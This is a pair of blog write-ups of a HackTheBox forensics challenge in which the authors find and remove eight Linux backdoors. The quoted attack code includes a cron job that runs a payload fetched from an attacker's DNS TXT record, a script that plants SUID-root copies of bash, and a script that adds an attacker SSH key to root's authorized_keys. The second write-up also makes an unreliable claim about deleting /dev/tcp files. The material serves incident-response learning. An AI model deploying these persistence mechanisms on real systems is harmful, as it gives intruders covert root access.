
##
#
https://0xv1n.github.io/posts/persistenceisfutile/
#
https://nier0x00.medium.com/persistenceisfutile-forensic-challenge-hackthebox-write-up-c45cfd7ec98
#
##

HackTheBox | PersistenceIsFutile
0xv1n included in htb challenges
 2021-07-31  1545 words   8 minutes 
Challenge Description:

Hackers made it onto one of our production servers 😅. We’ve isolated it from the internet until we can clean the machine up. The IR team reported eight difference backdoors on the server, but didn’t say what they were and we can’t get in touch with them. We need to get this server back into prod ASAP - we’re losing money every second it’s down. Please find the eight backdoors (both remote access and privilege escalation) and remove them. Once you’re done, run /root/solveme as root to check. You have SSH access and sudo rights to the box with the connections details attached below.

Forensic Analysis
So to get started with this challenge, I used two resources to guide me along the way. Additionally, we have a binary /root/solveme that will tell us our progress as we go along, so run it frequently to get status updates.:

https://linuxhint.com/determine_if_linux_is_compromised/
http://web.archive.org/web/20080109214340/http://www.cert.org/tech_tips/intruder_detection_checklist.html
Running Processes
By running ps auxf we can see all running processes on a Linux system, the user they’re running under, their PID (process id), and the command that was used to spawn the process. Here is the output:

/images/htb/challenges/forensics/persistenceisfutile/ps.png

That connectivity check process looks interesting. We can’t cat the file contents as user but we have root privileges through sudo.

/images/htb/challenges/forensics/persistenceisfutile/conn.png

This is clearly a background process to pop a reverse shell to 172.17.0.1 on port 443. So we’re going to remove this file rm -rf /var/lib/private/connectivity-check and then kill the process using the PID from ps auxf. I also am going to grep for “connectivity-check” to see if there are any other references on the file system. Sure enough, it’s in another location as well (so we need to remove this one as well):

root@forensicspersistence-329816-7c4d8fb9fd-7kgb7:~# grep -Ril "connectivity-check" /etc
/etc/update-motd.d/30-connectivity-check
When I went to get the PID, I noticed something new popped up in the running processes:

\_ sudo su -
  \_ su -
    \_ -bash
      \_ alertd -e /bin/bash -lnp 4444
That’s interesting, it looks like when I switched to the root user it spawned a new process of alertd and the syntax looks eerily similar to what we’d use to spawn a netcat listener on port 4444. I have no idea where that binary is though, but we can find it by running find / -name "alertd" and when we do we see it’s in /usr/bin/alertd. For now I’m just going to remove that file - but because it spawned when I loaded a shell as root, I have a feeling there’s something in our shell init script that’s doing that.

Alertd
To easily find where this binary is getting called from, we can grep for reference to it. If it’s spawning with shells, then it’s going to be in the shell rc file in either /root (the home directory for the root user) or /home/user.

root@forensicspersistence-329816-7c4d8fb9fd-7kgb7:~# grep -Ril "alertd" /root
/root/.bashrc
Knowing that we have a bad .bashrc, we can actually just overwrite it with the skeleton .bashrc stored in /etc/skel. To do that we simply run cp /etc/skel/.bashrc /root/.bashrc and we’ll repeat the process for the user account since for some reason their .bashrc is actually “owned” by root.

Cronjobs
user
We can see scheduled cron jobs by running crontab -l and sure enough we find something interesting:

user@forensicspersistence-329816-7c4d8fb9fd-7kgb7:~$ crontab -l
* * * * * /bin/sh -c "sh -c $(dig imf0rce.htb TXT +short @ns.imf0rce.htb)"
I spy a DNS TXT Beacon!

dig is a command used to query DNS records and from Cloudflare’s site, we see that we can enter arbitrary text into DNS TXT records. This particular cronjob is an example of using DNS TXT records to execute a payload onto a host. The way it works is, the attacker has a malicious DNS server in the wild and when the TXT record gets queried by a resolver, it will grab whatever is in that TXT record and use it as an argument for the sh -c command. It’s safe to assume that in this scenario, the TXT record of “imf0rce.htb” is storing a malicious payload. So, we can go ahead and remove this cron job by running crontab -e and deleting that entry. Since we found one cronjob on the user account, we should also look through the root account to see if there are any evil crons.

root
Running crontab -l as root didn’t show anything, but that doesn’t necessarily mean there aren’t malicious cron jobs. To verify this we can navigate to /etc and look through the various cron.* folders. There’s a few folders, but using some command line voodoo we can look through all them quickly by using a recursive ls on a blob like this:

root@forensicspersistence-329816-7c4d8fb9fd-7kgb7:/etc# ls -R ./cron.*
./cron.d:
anacron  e2scrub_all  popularity-contest

./cron.daily:
0anacron  access-up  apt-compat  bsdmainutils  dpkg  logrotate  man-db  popularity-contest  pyssh

./cron.hourly:

./cron.monthly:
0anacron

./cron.weekly:
0anacron  man-db
There are a few things that I don’t recognize from my familiarity with linux: access-up and pyssh. So let’s investigate those further.

access-up
#!/bin/bash
DIRS=("/bin" "/sbin")
DIR=${DIRS[$[ $RANDOM % 2 ]]}

while : ; do
    NEW_UUID=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 6 | head -n 1)
    [[ -f "{$DIR}/${NEW_UUID}" ]] || break
done

cp /bin/bash ${DIR}/${NEW_UUID}
touch ${DIR}/${NEW_UUID} -r /bin/bash
chmod 4755 ${DIR}/${NEW_UUID}
This is a really cool (and by “cool”, I of course mean DANGEROUS) bash script. Here’s what it’s doing line by line. First we define “DIRS” as either /bin or /sbin. Then we’re going to define another variable DIR that is going to divide a random number by 2, and if it has a remainder (i.e. it’s odd) we’ll use /sbin and if has no remainder we use /bin (2 % 2 = 0, 3 % 2 = 1). After that, it generates a random number via /dev/urandom and then converts the random number to alphabetic characters (a-z). So let’s say it generates the number “21312566”, then it will convert it to something like “folofwtt” then use fold -w 6 to take the first 6 characters, leaving us with “folofw” as our potential file name.

Once it’s generated a file name, it runs cp /bin/bash ${DIR}/${NEW_UUID} to essentially copy the bash shell into whatever DIR it landed on (/bin or /sbin) and then naming it according to the random name that was generated. So in my example, /bin/folofwtt actually is the same binary as /bin/bash. SPOOKY. The very last line is the most important part of this little script though. chmod 4755 is a huge red flag because the 4 means we’re giving this binary SetUID permission… aka root permission!. So if I, Joe Hacker, was to execute the random binary we generated (/bin/folofwtt) it would actually spawn an instance of /bin/bash owned by the user root. Yeah… big yikes here, so we DEFINITELY want to delete this script.

pyssh
#!/bin/sh

VER=$(python3 -c 'import ssh_import_id; print(ssh_import_id.VERSION)')
MAJOR=$(echo $VER | cut -d'.' -f1)

if [ $MAJOR -le 6 ]; then
    /lib/python3/dist-packages/ssh_import_id_update
fi
This script looks to be using a python module called ssh_import_id_update to do something. Investigating this file further:

#!/bin/bash
KEY=$(echo "c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUhSZHg1UnE1K09icTY2Y3l3ejVLVzlvZlZtME5DWjM5RVBEQTJDSkRxeDEgbm9ib2R5QG5vdGhpbmcK" | base64 -d)
PATH=$(echo "L3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMK" | base64 -d)

/bin/grep -q "$KEY" "$PATH" || echo "$KEY" >> "$PATH"
This script is adding whatever KEY is to PATH. They’re base64 encoded so let’s just run the commands and see what’s inside: /images/htb/challenges/forensics/persistenceisfutile/key.png /images/htb/challenges/forensics/persistenceisfutile/path.png

So this script is being used to add a public SSH key to the root user’s authorized_keys file. Meaning they’ll be able to SSH in as root whenever they want. So we’re gonna go ahead and remove this script and the cronjob that calls it. And with that, we’ve cleared all the potentially nasty cron jobs. Last thing in this step is to remove that SSH key from our authorized_keys file.

Binaries with SetUID permissions
Our next step is going to be to take a look at any binaries that are owned by root and also have SetUID permissions. To do this, we can use the command find / -user root -perm -4000 -print. Remember earlier, we found a script that generates binaries as root with 6-character names:

/images/htb/challenges/forensics/persistenceisfutile/setuid.png

We’ll go ahead and remove the suspicious binaries, and move on for now.

Checking users with Root Privilege
Next thing we want to do is go to /etc/passwd and /etc/shadow to see if there are any suspicious user accounts with elevated privilege and shell access.

root@forensicspersistence-329816-7c4d8fb9fd-7kgb7:~# cat /etc/passwd | grep -i "/bash"
root:x:0:0:root:/root:/bin/bash
gnats:x:41:0:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/bash
user:x:1000:1000::/home/user:/bin/bash
Gnats are annoying
I’m interested in that gnats user:

root@forensicspersistence-329816-7c4d8fb9fd-7kgb7:~# groups gnats
gnats : root
I’m pretty sure a “bug reporting” service doesn’t need root privilege or shell access, so let’s change that. We can change it’s shell to disable logins by running usermod -s /usr/sbin/nologin gnats. After that, we can change it’s group so it’s not a part of root by running usermod -g <groupid>. Doing these two things (removing login capability, and removing root gid) should be sufficient to lock down that account for now.

Flag
Between each step we can run /root/solveme to check our progress, and at this point it looks like we’re done.

root@forensicspersistence-329816-7c4d8fb9fd-7kgb7:~# /root/solveme
Issue 1 is fully remediated
Issue 2 is fully remediated
Issue 3 is fully remediated
Issue 4 is fully remediated
Issue 5 is fully remediated
Issue 6 is fully remediated
Issue 7 is fully remediated
Issue 8 is fully remediated

Congrats: HTB{.........}



PersistenceisFutile — Forensic Challenge — HackTheBox Write-up
0x00
0x00

·
Follow

6 min read
·
Sep 26, 2022




In this article, we will explore how to solve the Forensic Challenge called PersistenceisFutile present within HackTheBox. Credits to @0xdf for making this. This was rated “Medium” on the platform, but personally, I think some sub-sections of this challenge were not so medium. After solving this challenge, I saw that there was no proper write-up for this challenge and thus, for that reason I am writing this. I think this challenge is a great example of Incident Response.

With that said, let’s see the challenge itself first.


According to this prompt, we have SSH access and sudo rights as user “user”. Let’s SSH into the instance then.


After SSHing in successfully, we see a long hostname. I instantly knew that this was a Docker container. But fortunately for us, that fact has no bearing on the challenge itself.

Note — There are 8 backdoors and I do not know the order for them. But I'll write this the way I did it in one go.


On running ‘ll’ the current directory, we immediately see something pop out right away. It should be obvious that this should be deleted and we do so with “rm -rf .backdoor”.

I also took a look at .bashrc and found this


This is clearly a reverse shell. This might be unknown to some people, but to completely remediate a reverse shell situation, you have to also delete the /dev/tcp/[IP]/[Port] file as well. We do this by “rm -rf /dev/tcp/172.17.0.1/443”. I immediately remove this alias.

Since I found this, I thought to check the root folder as well. On opening .bashrc we see this.


We remove this line as well and delete alertd as shown below


My next step was to see what processes are running. I did so with “ps auxef” and you can see the output below.


Right away, we again see that something suspicious called “connectivity-check” is running using bash. We kill this using “kill -9 18” (the PID for you might be different). Make sure to kill the process that’s the least indented first and then the other remaining ones.


On opening the file we see the above. We also delete connectivity-check then.

Usually after checking for processes, I also check for SUID binaries (as part of my PrivEsc methodology. I do this by “find / -perm -04000 2>/dev/null”


Immediately we see some suspicious-looking binaries. We delete all these binaries using “rm -rf”

Now, what I also like to do is run a tool called PsPy. It basically monitors processes and see if any new ones pop up.


We transfer the tool (64 bit version) using scp to /home/user as we can see above.


On running PsPy, we see alertd pop up.

We run “ps auxef” again to check for alertd and we find it running.


Then, I decided to check the cron files. I checked the crontab for root and there was nothing suspicious there. Then I also checked for the cron for user and found this.


This probably digs up the TXT record from imf0rce.HTB and run whatever is on it using sh. The file for crontab is stored in /var/spool/cron/crontabs as user. We delete this file as well. I decided to check other cron files as well in /etc.


We see two files that are normally not there.

Let’s look at pyssh first

There is a dist-package in the python3 directories called ssh_import_id_update which I thought looked suspicious.


It seems that this file basically adds a key to some path. We base64 decode the commands and get the following.


Seeing this, I then check authorized_keys in .ssh of root and remove this particular key.

Now let’s look at access-up

So, it seems that bash is copied into bin or sbin with some random letters via tr and /dev/urandom. We see that the permissions set were 4755 and so we search for files with that permission with “find”.


As we can see, there is no random lettered binaries running here because we already removed them (dlxcrw and others). Finally, we remove both access-up and pyssh.

Then I remembered that “connectivity-check” was also running automatically somehow. I didn’t find anything in the cron files for sure. So I decided to look for any file that has the substring “connectivity-check” using “find / -type f -name “*connectivity-check*” 2>/dev/null”. Sure enough, I found something I had not found before.



On opening the file we can see that it runs a nohup on connectivity-check. We immediately delete this file as well.

Then as root, I thought to check the /etc/shadow and /etc/passwd files. I found something odd in /etc/passwd.


If you look closely here, it seems that /bin/bash is in the line for gnats. But gnats is not a user like “user” or “root” so this was suspicious. Furthermore, it seems that gnats is in the root group (as indicated by the text “41:0”) . Thus, we change /bin/bash to /usr/sbin/nologin and change the 0 to 41.


On opening /etc/shadow, we clearly see a hash associated with gnats which simply means that gnats is registered as a user.


Thus, we remove the hash and make it into an account like the others above it.

I decided to check the solveme binary in root and saw the flag.


I really liked this challenge and learnt a lot. This was my first write-up and I hope you learnt something.

